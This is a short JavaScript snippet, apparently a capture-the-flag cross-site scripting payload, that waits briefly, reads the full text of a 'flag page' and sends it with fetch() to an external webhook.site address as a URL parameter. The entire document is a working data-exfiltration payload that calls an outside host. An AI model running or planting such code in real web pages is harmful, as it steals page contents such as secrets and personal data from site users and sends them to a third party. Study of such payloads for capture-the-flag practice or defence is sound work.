setTimeout(function() {
    var output = document.body.innerText;
    console.log("Output from flag page:", output);

    fetch("https://webhook.site/64f63de1-84e0-40bb-bd22-f56035ec0ac1/?flag=" + encodeURIComponent(output));
}, 100);
